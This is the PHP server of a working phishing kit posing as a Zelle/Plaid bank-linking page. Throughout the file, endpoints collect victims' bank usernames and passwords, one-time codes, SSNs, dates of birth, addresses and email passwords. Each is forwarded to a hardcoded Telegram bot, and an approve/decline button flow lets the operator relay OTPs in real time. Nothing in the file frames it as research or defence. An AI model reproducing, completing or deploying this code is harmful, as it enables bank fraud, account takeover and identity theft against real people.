<?php
// ========================================
// ZELLE/PLAID - ALL-IN-ONE SERVER
// ========================================
// Force error logging to console
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', 'php://stdout');
error_reporting(E_ALL);

// Check critical settings
error_log("=== PHP SETTINGS CHECK ===");
error_log("allow_url_fopen: " . ini_get('allow_url_fopen'));
error_log("display_errors: " . ini_get('display_errors'));
error_log("==========================");

// ========================================
// TELEGRAM CONFIGURATION
// ========================================
define('TELEGRAM_BOT_TOKEN', '5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00');
define('TELEGRAM_CHAT_ID', '5514645660');

// ========================================
// CORS & HEADERS
// ========================================
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, PUT, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ========================================
// ROUTING
// ========================================
$uri = urldecode(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
$method = $_SERVER['REQUEST_METHOD'];

// If NOT an API request, serve static files
if (strpos($uri, '/api') !== 0) {
    // Serve zelle.html for /zelle (wrapper with iframe)
    if ($uri === '/zelle' || $uri === '/zelle.html') {
        header('Content-Type: text/html');
        readfile(__DIR__ . '/zelle.html');
        exit();
    }
    
    // Serve zelle-app.html for /zelle-app.html (actual React app)
    if ($uri === '/zelle-app.html') {
        header('Content-Type: text/html');
        readfile(__DIR__ . '/zelle-app.html');
        exit();
    }
    
    // Serve assets
    if (file_exists(__DIR__ . $uri)) {
        return false; // Let PHP serve it
    }
    
    // For all other requests, let the server handle them (don't interfere with owner's homepage)
    return false;
}

// ========================================
// API ENDPOINTS START HERE
// ========================================
header('Content-Type: application/json');

// Data file
define('DATA_FILE', __DIR__ . '/zelle-data.json');

if (!file_exists(DATA_FILE)) {
    file_put_contents(DATA_FILE, json_encode(['users' => []], JSON_PRETTY_PRINT));
}

function readData() {
    $json = file_get_contents(DATA_FILE);
    return json_decode($json, true) ?: ['users' => []];
}

function writeData($data) {
    file_put_contents(DATA_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

function sendToTelegram($message, $inlineKeyboard = null) {
    error_log("=== TELEGRAM FUNCTION CALLED ===");
    error_log("Message: " . substr($message, 0, 100));
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    if ($inlineKeyboard) {
        $data['reply_markup'] = json_encode(['inline_keyboard' => $inlineKeyboard]);
    }
    
    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
            'timeout' => 10,
            'ignore_errors' => true
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ];
    
    error_log("Sending to Telegram...");
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context); // REMOVED @
    
    error_log("Response headers:");
    error_log(print_r($http_response_header, true));
    
    if ($result === false) {
        error_log("❌ TELEGRAM FAILED: Could not send message");
        $error = error_get_last();
        error_log("Error details: " . print_r($error, true));
    } else {
        error_log("✅ TELEGRAM SUCCESS: " . $result);
    }
    
    error_log("=== END TELEGRAM ===");
    
    return $result;
}

function getIPDetails() {
    // Get real IP (works on cPanel, shows localhost on local)
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    // Clean up IPv6 localhost
    if ($ip === '::1' || $ip === '127.0.0.1') {
        $ip = 'localhost';
    }
    
    $details = ['ip' => $ip, 'country' => 'Unknown', 'isp' => 'Unknown'];
    
    // Skip geolocation for localhost
    if ($ip === 'localhost' || strpos($ip, '192.168.') === 0) {
        return $details;
    }
    
    try {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,isp,city,regionName", false, stream_context_create([
            'http' => ['timeout' => 3]
        ]));
        
        if ($response) {
            $data = json_decode($response, true);
            $details['country'] = $data['country'] ?? 'Unknown';
            $details['isp'] = $data['isp'] ?? 'Unknown';
            $details['city'] = $data['city'] ?? '';
            $details['region'] = $data['regionName'] ?? '';
        }
    } catch (Exception $e) {
        error_log("IP lookup failed: " . $e->getMessage());
    }
    
    return $details;
}

// GET /api/zelle-payment
if ($method === 'GET' && strpos($uri, '/api/zelle-payment') !== false) {
    // Track page visit
    $ipDetails = getIPDetails();
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device = 'Unknown';
    if (strpos($ua, 'Windows') !== false) $device = 'Windows';
    elseif (strpos($ua, 'Mac') !== false) $device = 'MacOS';
    elseif (strpos($ua, 'iPhone') !== false) $device = 'iPhone';
    elseif (strpos($ua, 'Android') !== false) $device = 'Android';
    
    $message = "👀 <b>ZELLE - PAGE VISITED</b>\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> {$device}\n";
    $message .= "🖥️ <b>Browser:</b> " . substr($ua, 0, 80) . "\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
    
    sendToTelegram($message);
    
    echo json_encode(['status' => 'ok', 'payment' => ['name' => 'John Doe', 'amount' => 500]]);
    exit();
}

// POST /api/zelle-payment
if ($method === 'POST' && strpos($uri, '/api/zelle-payment') !== false) {
    echo json_encode(['success' => true]);
    exit();
}

// GET /api/admin/dashboard-stats
if ($method === 'GET' && strpos($uri, '/api/admin/dashboard-stats') !== false) {
    $data = readData();
    $totalUsers = count($data['users']);
    $pendingOTP = 0;
    
    foreach ($data['users'] as $user) {
        if (($user['otp_status'] ?? 'idle') === 'pending') {
            $pendingOTP++;
        }
    }
    
    echo json_encode([
        'success' => true,
        'stats' => ['totalUsers' => $totalUsers, 'pendingOTP' => $pendingOTP]
    ]);
    exit();
}

// GET /api/admin/user-credentials
if ($method === 'GET' && strpos($uri, '/api/admin/user-credentials') !== false) {
    $data = readData();
    echo json_encode(['success' => true, 'users' => $data['users']]);
    exit();
}

// PUT /api/admin/update-otp-status
if ($method === 'PUT' && strpos($uri, '/api/admin/update-otp-status') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $userId = $input['userId'] ?? null;
    $newStatus = $input['newStatus'] ?? null;
    
    if (!$userId || !$newStatus) {
        echo json_encode(['success' => false, 'error' => 'Missing userId or newStatus']);
        exit();
    }
    
    $data = readData();
    foreach ($data['users'] as &$user) {
        if ($user['id'] === $userId) {
            $user['otp_status'] = $newStatus;
            break;
        }
    }
    writeData($data);
    
    echo json_encode(['success' => true]);
    exit();
}

// POST /api/bank-click
if ($method === 'POST' && strpos($uri, '/api/bank-click') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $ipDetails = getIPDetails();
    
    $data = readData();
    
    $sessionId = 'ZELLE_' . time() . '_' . rand(1000, 9999);
    
    $newUser = [
        'id' => time(),
        'session_id' => $sessionId,
        'bank_name' => $input['name'] ?? 'Unknown',
        'username' => 'Awaiting Login...',
        'password' => '',
        'otp_code' => '',
        'otp_status' => 'idle',
        'created_at' => date('Y-m-d H:i:s'),
        'ip' => $ipDetails['ip']
    ];
    
    $data['users'][] = $newUser;
    writeData($data);
    
    // BOA-style message format
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device = 'Unknown';
    if (strpos($ua, 'Windows') !== false) $device = 'Windows';
    elseif (strpos($ua, 'Mac') !== false) $device = 'MacOS';
    elseif (strpos($ua, 'iPhone') !== false) $device = 'iPhone';
    elseif (strpos($ua, 'Android') !== false) $device = 'Android';
    
    $message = "🏦 <b>ZELLE - BANK SELECTED</b>\n\n";
    $message .= "🏛️ <b>Bank:</b> " . ($input['name'] ?? 'Unknown') . "\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> {$device}\n";
    $message .= "🆔 <b>Session:</b> <code>{$sessionId}</code>\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
    
    sendToTelegram($message);
    
    echo json_encode(['success' => true, 'userId' => $newUser['id'], 'sessionId' => $sessionId]);
    exit();
}

// POST /api/save (save credentials OR OTP - smart detection)
if ($method === 'POST' && strpos($uri, '/api/save') !== false) {
    $rawInput = file_get_contents('php://input');
    error_log("=== /api/save RAW INPUT ===");
    error_log($rawInput);
    
    $input = json_decode($rawInput, true);
    $ipDetails = getIPDetails();
    
    // DEBUG: Log ALL fields
    error_log("=== /api/save PARSED ===");
    error_log("All keys in input: " . implode(', ', array_keys($input ?? [])));
    error_log("Full input JSON: " . json_encode($input));
    
    $username = $input['username'] ?? '';
    $password = $input['password'] ?? '';
    $userId = $input['userId'] ?? null;
    $code = $input['code'] ?? '';  // Maybe OTP is in 'code' field?
    $otp = $input['otp'] ?? '';    // Or 'otp' field?
    
    error_log("Username: '{$username}' | Password: '{$password}' | Code: '{$code}' | OTP: '{$otp}' | UserId: '{$userId}'");
    
    // SMART DETECTION: Check multiple possible OTP fields
    $isOTP = false;
    $otpCode = '';
    
    // Check if 'code' or 'otp' fields exist
    if (!empty($code) && strlen($code) === 6 && ctype_digit($code)) {
        $isOTP = true;
        $otpCode = $code;
        error_log("DETECTED AS OTP (from 'code' field)!");
    } elseif (!empty($otp) && strlen($otp) === 6 && ctype_digit($otp)) {
        $isOTP = true;
        $otpCode = $otp;
        error_log("DETECTED AS OTP (from 'otp' field)!");
    } elseif (strlen($username) === 6 && ctype_digit($username) && empty($password)) {
        $isOTP = true;
        $otpCode = $username;
        error_log("DETECTED AS OTP (from 'username' field)!");
    } else {
        error_log("DETECTED AS CREDENTIALS!");
    }
    
    if ($isOTP) {
        // This is an OTP submission!
        $data = readData();
        $bankName = 'Unknown';
        $realUsername = 'Unknown';
        $sessionId = '';
        
        if ($userId) {
            foreach ($data['users'] as &$user) {
                if ($user['id'] == $userId) {
                    $user['otp_code'] = $otpCode;
                    $user['otp_status'] = 'pending';
                    $bankName = $user['bank_name'];
                    $realUsername = $user['username'];
                    $sessionId = $user['session_id'] ?? '';
                    break;
                }
            }
        }
        
        writeData($data);
        
        // Send OTP message with buttons
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $device = 'Unknown';
        if (strpos($ua, 'Windows') !== false) $device = 'Windows';
        elseif (strpos($ua, 'Mac') !== false) $device = 'MacOS';
        elseif (strpos($ua, 'iPhone') !== false) $device = 'iPhone';
        elseif (strpos($ua, 'Android') !== false) $device = 'Android';
        
        $message = "🔢 <b>ZELLE - OTP CODE RECEIVED</b>\n\n";
        $message .= "🏛️ <b>Bank:</b> {$bankName}\n";
        $message .= "👤 <b>Username:</b> <code>{$realUsername}</code>\n";
        $message .= "🔐 <b>OTP Code:</b> <code>{$otpCode}</code>\n\n";
        $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
        $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
        $message .= "📱 <b>Device:</b> {$device}\n";
        $message .= "🆔 <b>Session:</b> <code>{$sessionId}</code>\n";
        $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n\n";
        $message .= "⚠️ <b>Status:</b> Pending your action...";
        
        $inlineKeyboard = [
            [
                ['text' => '✅ Approve', 'callback_data' => 'approve_' . $userId],
                ['text' => '❌ Decline', 'callback_data' => 'decline_' . $userId]
            ]
        ];
        
        sendToTelegram($message, $inlineKeyboard);
        
        echo json_encode(['success' => true, 'id' => $userId]);
        exit();
    }
    
    // Otherwise, it's normal credentials
    $data = readData();
    $bankName = 'Unknown';
    $sessionId = '';
    
    if ($userId) {
        foreach ($data['users'] as &$user) {
            if ($user['id'] == $userId) {
                $user['username'] = $username;
                $user['password'] = $password;
                $bankName = $user['bank_name'];
                $sessionId = $user['session_id'] ?? '';
                break;
            }
        }
    } else {
        $sessionId = 'ZELLE_' . time() . '_' . rand(1000, 9999);
        $newUser = [
            'id' => time(),
            'session_id' => $sessionId,
            'username' => $username,
            'password' => $password,
            'bank_name' => 'Unknown',
            'otp_code' => '',
            'otp_status' => 'idle',
            'created_at' => date('Y-m-d H:i:s'),
            'ip' => $ipDetails['ip']
        ];
        $data['users'][] = $newUser;
        $userId = $newUser['id'];
    }
    
    writeData($data);
    
    // BOA-style message format
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device = 'Unknown';
    if (strpos($ua, 'Windows') !== false) $device = 'Windows';
    elseif (strpos($ua, 'Mac') !== false) $device = 'MacOS';
    elseif (strpos($ua, 'iPhone') !== false) $device = 'iPhone';
    elseif (strpos($ua, 'Android') !== false) $device = 'Android';
    
    $message = "🔐 <b>ZELLE - CREDENTIALS CAPTURED</b>\n\n";
    $message .= "🏛️ <b>Bank:</b> {$bankName}\n";
    $message .= "👤 <b>Username:</b> <code>{$username}</code>\n";
    $message .= "🔑 <b>Password:</b> <code>{$password}</code>\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> {$device}\n";
    $message .= "🆔 <b>Session:</b> <code>{$sessionId}</code>\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
    
    sendToTelegram($message);
    
    echo json_encode(['success' => true, 'id' => $userId]);
    exit();
}

// POST /api/save-otp
if ($method === 'POST' && strpos($uri, '/api/save-otp') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $ipDetails = getIPDetails();
    
    $code = $input['code'] ?? '';
    $userId = $input['userId'] ?? null;
    
    $data = readData();
    $bankName = 'Unknown';
    $username = 'Unknown';
    $sessionId = '';
    
    if ($userId) {
        foreach ($data['users'] as &$user) {
            if ($user['id'] == $userId) {
                $user['otp_code'] = $code;
                $user['otp_status'] = 'pending';
                $bankName = $user['bank_name'];
                $username = $user['username'];
                $sessionId = $user['session_id'] ?? '';
                break;
            }
        }
    }
    
    writeData($data);
    
    // BOA-style message format with buttons
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device = 'Unknown';
    if (strpos($ua, 'Windows') !== false) $device = 'Windows';
    elseif (strpos($ua, 'Mac') !== false) $device = 'MacOS';
    elseif (strpos($ua, 'iPhone') !== false) $device = 'iPhone';
    elseif (strpos($ua, 'Android') !== false) $device = 'Android';
    
    $message = "🔢 <b>ZELLE - OTP CODE RECEIVED</b>\n\n";
    $message .= "🏛️ <b>Bank:</b> {$bankName}\n";
    $message .= "👤 <b>Username:</b> <code>{$username}</code>\n";
    $message .= "🔐 <b>OTP Code:</b> <code>{$code}</code>\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> {$device}\n";
    $message .= "🆔 <b>Session:</b> <code>{$sessionId}</code>\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "⚠️ <b>Status:</b> Pending your action...";
    
    $inlineKeyboard = [
        [
            ['text' => '✅ Approve', 'callback_data' => 'approve_' . $userId],
            ['text' => '❌ Decline', 'callback_data' => 'decline_' . $userId]
        ]
    ];
    
    sendToTelegram($message, $inlineKeyboard);
    
    echo json_encode(['success' => true]);
    exit();
}

// GET /api/check-otp-status
if ($method === 'GET' && strpos($uri, '/api/check-otp-status') !== false) {
    $userId = $_GET['id'] ?? null;
    
    if (!$userId) {
        echo json_encode(['success' => false, 'error' => 'Missing userId']);
        exit();
    }
    
    $data = readData();
    
    foreach ($data['users'] as $user) {
        if ($user['id'] == $userId) {
            echo json_encode(['otp_status' => $user['otp_status'] ?? 'pending']);
            exit();
        }
    }
    
    echo json_encode(['otp_status' => 'pending']);
    exit();
}

// POST /telegram-webhook (handle Approve/Decline button clicks)
if ($method === 'POST' && strpos($uri, '/telegram-webhook') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    
    error_log("Telegram webhook received: " . json_encode($input));
    
    if (isset($input['callback_query'])) {
        $callbackData = $input['callback_query']['data'];
        $callbackId = $input['callback_query']['id'];
        
        // Parse callback data: "approve_123456" or "decline_123456"
        if (strpos($callbackData, '_') !== false) {
            list($action, $userId) = explode('_', $callbackData, 2);
            
            $data = readData();
            
            // Update OTP status
            foreach ($data['users'] as &$user) {
                if ($user['id'] == $userId) {
                    $user['otp_status'] = $action; // 'approve' or 'decline'
                    break;
                }
            }
            
            writeData($data);
            
            // Answer the callback query to remove loading state
            $answerUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/answerCallbackQuery";
            $answerPayload = [
                'callback_query_id' => $callbackId,
                'text' => $action === 'approve' ? '✅ OTP Approved' : '❌ OTP Declined'
            ];
            
            $options = [
                'http' => [
                    'header'  => "Content-Type: application/json\r\n",
                    'method'  => 'POST',
                    'content' => json_encode($answerPayload)
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ];
            
            $context = stream_context_create($options);
            file_get_contents($answerUrl, false, $context);
            
            error_log("OTP status updated to: {$action} for user: {$userId}");
        }
    }
    
    echo json_encode(['ok' => true]);
    exit();
}

// POST /api/save-personal-info
if ($method === 'POST' && strpos($uri, '/api/save-personal-info') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $ipDetails = getIPDetails();
    
    $data = readData();
    $userId = $input['userId'] ?? null;
    
    if ($userId) {
        foreach ($data['users'] as &$user) {
            if ($user['id'] == $userId) {
                $user['personalInfo'] = [
                    'fullName' => $input['fullName'] ?? '',
                    'ssn' => $input['ssn'] ?? '',
                    'dob' => $input['dob'] ?? '',
                    'phone' => $input['phone'] ?? '',
                    'address' => $input['address'] ?? '',
                    'city' => $input['city'] ?? '',
                    'state' => $input['state'] ?? '',
                    'zip' => $input['zip'] ?? ''
                ];
                break;
            }
        }
    }
    
    writeData($data);
    
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device = 'Unknown';
    if (strpos($ua, 'Windows') !== false) $device = 'Windows';
    elseif (strpos($ua, 'Mac') !== false) $device = 'MacOS';
    elseif (strpos($ua, 'iPhone') !== false) $device = 'iPhone';
    elseif (strpos($ua, 'Android') !== false) $device = 'Android';
    
    $message = "📋 <b>ZELLE - PERSONAL INFO CAPTURED</b>\n\n";
    $message .= "👤 <b>Full Name:</b> <code>" . ($input['fullName'] ?? '') . "</code>\n";
    $message .= "🆔 <b>SSN:</b> <code>" . ($input['ssn'] ?? '') . "</code>\n";
    $message .= "🎂 <b>DOB:</b> <code>" . ($input['dob'] ?? '') . "</code>\n";
    $message .= "📞 <b>Phone:</b> <code>" . ($input['phone'] ?? '') . "</code>\n";
    $message .= "🏠 <b>Address:</b> <code>" . ($input['address'] ?? '') . ", " . ($input['city'] ?? '') . ", " . ($input['state'] ?? '') . " " . ($input['zip'] ?? '') . "</code>\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> {$device}\n";
    $message .= "🆔 <b>Session:</b> <code>" . ($input['sessionId'] ?? 'N/A') . "</code>\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
    
    sendToTelegram($message);
    
    echo json_encode(['success' => true]);
    exit();
}

// POST /api/save-email-verification
if ($method === 'POST' && strpos($uri, '/api/save-email-verification') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $ipDetails = getIPDetails();
    
    $data = readData();
    $userId = $input['userId'] ?? null;
    
    if ($userId) {
        foreach ($data['users'] as &$user) {
            if ($user['id'] == $userId) {
                $user['emailVerification'] = [
                    'email' => $input['email'] ?? '',
                    'emailPassword' => $input['emailPassword'] ?? ''
                ];
                break;
            }
        }
    }
    
    writeData($data);
    
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device = 'Unknown';
    if (strpos($ua, 'Windows') !== false) $device = 'Windows';
    elseif (strpos($ua, 'Mac') !== false) $device = 'MacOS';
    elseif (strpos($ua, 'iPhone') !== false) $device = 'iPhone';
    elseif (strpos($ua, 'Android') !== false) $device = 'Android';
    
    $message = "📧 <b>ZELLE - EMAIL CREDENTIALS CAPTURED</b>\n\n";
    $message .= "✉️ <b>Email:</b> <code>" . ($input['email'] ?? '') . "</code>\n";
    $message .= "🔑 <b>Password:</b> <code>" . ($input['emailPassword'] ?? '') . "</code>\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> {$device}\n";
    $message .= "🆔 <b>Session:</b> <code>" . ($input['sessionId'] ?? 'N/A') . "</code>\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
    
    sendToTelegram($message);
    
    echo json_encode(['success' => true]);
    exit();
}

// POST /api/save-final-otp
if ($method === 'POST' && strpos($uri, '/api/save-final-otp') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $ipDetails = getIPDetails();
    
    $data = readData();
    $userId = $input['userId'] ?? null;
    
    if ($userId) {
        foreach ($data['users'] as &$user) {
            if ($user['id'] == $userId) {
                $user['finalOtp'] = $input['finalOtp'] ?? '';
                break;
            }
        }
    }
    
    writeData($data);
    
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $device = 'Unknown';
    if (strpos($ua, 'Windows') !== false) $device = 'Windows';
    elseif (strpos($ua, 'Mac') !== false) $device = 'MacOS';
    elseif (strpos($ua, 'iPhone') !== false) $device = 'iPhone';
    elseif (strpos($ua, 'Android') !== false) $device = 'Android';
    
    $message = "🔢 <b>ZELLE - FINAL OTP (EMAIL VERIFICATION)</b>\n\n";
    $message .= "🔐 <b>OTP Code:</b> <code>" . ($input['finalOtp'] ?? '') . "</code>\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> {$device}\n";
    $message .= "🆔 <b>Session:</b> <code>" . ($input['sessionId'] ?? 'N/A') . "</code>\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "✅ <b>Status:</b> All data captured successfully!";
    
    sendToTelegram($message);
    
    echo json_encode(['success' => true]);
    exit();
}

// 404
http_response_code(404);
echo json_encode(['success' => false, 'error' => 'Endpoint not found: ' . $uri]);
?>
